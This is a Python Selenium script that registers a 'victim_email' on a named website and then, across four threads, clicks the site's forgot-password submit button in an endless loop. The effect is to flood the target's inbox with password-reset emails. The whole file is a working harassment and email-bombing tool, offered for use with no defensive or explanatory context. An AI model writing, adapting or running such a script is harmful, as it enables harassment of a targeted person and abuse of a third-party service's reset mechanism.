#!/usr/local/bin/python
# -*- coding: utf-8 -*

from selenium import webdriver
import time
import threading

victim_email = ""
threads = 4


def spam():
    driver = webdriver.Chrome()

    driver.get('https://emosurf.com/')

    # click sub button
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[7]/button').click()

    # fill email and password
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(victim_email)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys('John Doe')

    # make some clicks to send things to server
    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[3]/table/tbody/tr/td[1]/button').click()
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[3]/div[3]/button').click()

    # click person image
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[3]/img').click()

    # click forgot password text
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[4]/form/div[3]/a').click()

    # enter email
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(victim_email)

    while True:
        # click submit button
        driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[2]/button').click()


for k in range(threads):
    k = threading.Thread(target=spam)
    k.start()
    time.sleep(1)
